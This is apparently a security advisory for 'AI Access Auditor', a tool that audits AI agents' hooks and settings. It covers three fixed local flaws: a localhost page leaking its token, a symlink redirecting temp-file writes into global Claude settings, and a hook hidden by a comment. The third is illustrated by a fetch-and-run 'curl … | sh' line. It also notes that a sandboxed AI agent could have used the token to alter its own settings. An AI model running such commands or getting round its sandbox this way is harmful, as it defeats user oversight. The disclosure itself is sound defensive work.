# Security review 2: AI Access Auditor

**Date:** November 14, 2026
**Version reviewed:** 1.0.12 by the reporter. All three issues were still present in 1.0.14, and are fixed in **1.0.15**.
**Reported by:** an outside security researcher, through a written assessment. Each finding was checked against the
code and reproduced by the maintainer before it was fixed.

## Summary

The assessment reported three issues. **All three were real**, and all three are fixed in 1.0.15. None of them can be
used from another computer or from a website: each needs a program that already runs on the same computer, or a
project folder prepared by someone else.

| # | Issue | Severity | Status |
|---|---|---|---|
| 1 | The app's page gave its access token to any program on the computer that asked for it | High | Fixed |
| 2 | Saving a file could write through a link planted next to it, into another file | High | Fixed |
| 3 | A hook could hide from the scan by mentioning the app's name | Medium | Fixed |

## Findings

### 1. The page gave out the access token (High, fixed)

The app's window is a page served by its own small server on `127.0.0.1`. The server refused every request without
the app's secret token, except the page itself, and the page contains the token. Any program running on the computer,
under any account, could load the page, read the token, and then use the app as if it were you: turn off the "Ask
before" hooks, revoke or restore settings, or end programs.

That matters in two cases. On a computer shared by several people, another account could control your copy of the
app. And an AI agent kept in a sandbox that blocks your settings files, but allows local network connections, could
use the app to change those files for it.

**Fix:** the page now opens only with the token. The Mac, Windows and Linux apps already receive the token from the
server they start, and pass it when they open the window. The server then replaces it with a cookie that only that
window can use (`HttpOnly`, `SameSite=Strict`) and removes it from the address. Anyone else gets a page that says to
open the app. When the server is started from a terminal, it prints a link that contains the token.

### 2. Saving a file could write into another file (High, fixed)

To change a settings file safely, the app writes the new version next to it under a fixed name
(`<file>.ai-audit-tmp`), then puts it in place. If that name already existed as a link, the write followed the link.
A project folder prepared by someone else (a repository you cloned, for example) could contain such a link, pointing
at your global `~/.claude/settings.json`. Revoking something in that project would then replace your global settings
with the project's own settings, including any hooks it contains.

**Fix:** the temporary file now gets a new random name each time, and it is created only if nothing exists under that
name. A planted link makes the save fail; it can't redirect it.

### 3. Hooks could hide by mentioning the app (Medium, fixed)

The app skips its own "Ask before" hooks when it lists the hooks in your agents' settings. It recognised them by
looking for its name anywhere in the hook. A hook such as `curl https://… | sh # AI Access Auditor` was therefore
hidden from the scan, and could make the "Ask before" switch look on when it wasn't.

**Fix:** a hook now counts as the app's own only if its command is exactly the one the app writes: Node.js (or the app
itself) running the app's `gate.js`, and nothing else. Every hook in the entry must match. Names, comments and
descriptions no longer matter. Hooks written by every earlier version of the app are still recognised.

## How the fixes were checked

- Each issue was reproduced on the released code before the fix, with invented settings files, and checked again
  afterwards.
- New automatic tests cover each one. They run before every release, on macOS, Linux and Windows. The hook test also
  tries variants of the attack: a command added after the gate, a command hidden in the program path, and a different
  program running the gate script.
- The Mac app was built and opened on invented data, to confirm its window still opens with the token.

## Notes on the assessment

The assessment was accurate and reproducible, and its severity ratings were fair: all three issues are local. The
fixes differ a little from the patch it proposed. For the temporary file, a random name was added to the
"create only if new" rule it suggested. For the hooks, the check also refuses `$` and backticks in the command, which
the shell would run even inside quotes.

## Reporting a security problem

Please report security issues privately through GitHub: on the repository page, open
**Security → Report a vulnerability**.
